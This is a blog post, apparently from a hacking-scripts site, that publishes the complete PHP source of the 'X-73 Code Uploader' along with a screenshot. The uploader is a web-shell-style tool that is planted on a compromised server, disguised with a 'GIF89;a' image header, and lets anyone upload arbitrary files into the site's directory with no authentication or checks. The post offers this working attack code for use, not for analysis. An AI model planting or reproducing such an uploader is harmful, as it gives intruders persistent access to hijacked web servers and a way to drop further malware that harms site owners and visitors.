---
id: 245
title: X-73 Code Uploader
author: admin
layout: post
guid: http://hackingscripts.com/?p=245
permalink: /x-73-code-uploader/
categories:
  - PHP
tags:
  - PHP
  - X-73
---
&#8211;==@[&#8211; X-73 CODE UPLOADER &#8211;]==&#8211;


### X-73 Code Uploader Source Code

{% highlight php linenos %}GIF89;a
<?php
    $myUpload = new maxUpload(); 
    //$myUpload->setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
    $myUpload->uploadFile();
?>
<?php
class maxUpload{
    var $uploadLocation;
    
    /**
     * Constructor to initialize class varaibles
     * The uploadLocation will be set to the actual 
     * working directory
     *
     * @return maxUpload
     */
    function maxUpload(){
        $this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
    }

    /**
     * This function sets the directory where to upload the file
     * In case of Windows server use the form: c:\\temp\\
     * In case of Unix server use the form: /tmp/
     *
     * @param String Directory where to store the files
     */
    function setUploadLocation($dir){
        $this->uploadLocation = $dir;
    }
    
    function showUploadForm($msg='',$error=''){
?>
       <div id="container">
            <div id="header"><div id="header_left"></div>
            <div id="header_main">SUL-BAR LINK<div id="header_right"></div></div>
            <div id="content">
<?php
if ($msg != ''){
    echo '<p class="msg">'.$msg.'</p>';
} else if ($error != ''){
    echo '<p class="emsg">'.$error.'</p>';

}
?>
<body bgcolor="#000000"><center><div style="background-image:url(''); width="1040" height="710" class="shakeimage" onMouseOver="init(this);rattleimage()" onMouseOut="stoprattle(this);top.focus()" onClick="top.focus()" alt="" border="0"><br><div
id="example1"></div><p id="example2"><font face="Papyrus"; color="red"; size="6"><br>--==@[-- X-73 CODE UPLOADER --]==--

                <form action="" method="post" enctype="multipart/form-data" >
                     <center>
                         <label>File:
                             <input name="myfile" type="file" size="30" />
                         </label>
                         <label>
                             <input type="submit" name="submitBtn" class="sbtn" value="Upload" />
                         </label>
                     </center>
                 </form>
             </div>
             <div id="footer"><a href="http://www.sekedar-online.com" target="_blank">Sulbar-Link</a></div>
         </div>
<?php
    }

    function uploadFile(){
        if (!isset($_POST['submitBtn'])){
            $this->showUploadForm();
        } else {
            $msg = '';
            $error = '';
            
            //Check destination directory
            if (!file_exists($this->uploadLocation)){
                $error = "The target directory doesn't exists!";
            } else if (!is_writeable($this->uploadLocation)) {
                $error = "The target directory is not writeable!";
            } else {
                $target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);

                if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = basename( $_FILES['myfile']['name']).
                    " File anda sukses di Upload!";
                } else{
                    $error = "Proses Upload terganggu!";
                }
            }

            $this->showUploadForm($msg,$error);
        }

    }

}
?>
{% endhighlight %}


### X-73 Code Uploader screenshot<figure id="attachment_434" style="width: 604px;" class="wp-caption aligncenter">

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/x-73-code-uploader-1024x351.png" alt="X-73 code uploader screenshot" width="604" height="207" class="size-large wp-image-434" />][1]<figcaption class="wp-caption-text">X-73 code uploader screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/x-73-code-uploader.png